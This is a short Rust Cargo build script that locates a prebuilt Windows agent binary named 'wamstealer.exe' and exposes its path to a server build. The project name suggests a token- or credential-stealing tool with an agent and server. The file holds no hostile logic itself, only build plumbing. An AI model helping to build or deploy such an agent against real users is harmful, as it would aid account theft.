use std::{env, path::PathBuf};

fn main() {
    let manifest = PathBuf::from(env::var("CARGO_MANIFEST_DIR").unwrap());

    let mut candidates = Vec::new();
    if let Ok(path) = env::var("WAMSTEALER_AGENT_EXE") {
        candidates.push(PathBuf::from(path));
    }
    candidates.push(manifest.join("../target/x86_64-pc-windows-gnu/release/wamstealer.exe"));
    candidates.push(manifest.join("../target/release/wamstealer.exe"));

    let agent = candidates
        .iter()
        .find(|path| path.is_file())
        .unwrap_or_else(|| {
            panic!(
                "no wamstealer agent executable found. Build it first with build.sh \
                 (or build.ps1 on Windows), or point WAMSTEALER_AGENT_EXE at a built \
                 wamstealer.exe before building the server."
            )
        });

    println!("cargo:rustc-env=WAMSTEALER_AGENT_EXE={}", agent.display());
    println!("cargo:rerun-if-changed={}", agent.display());
    println!("cargo:rerun-if-env-changed=WAMSTEALER_AGENT_EXE");
}
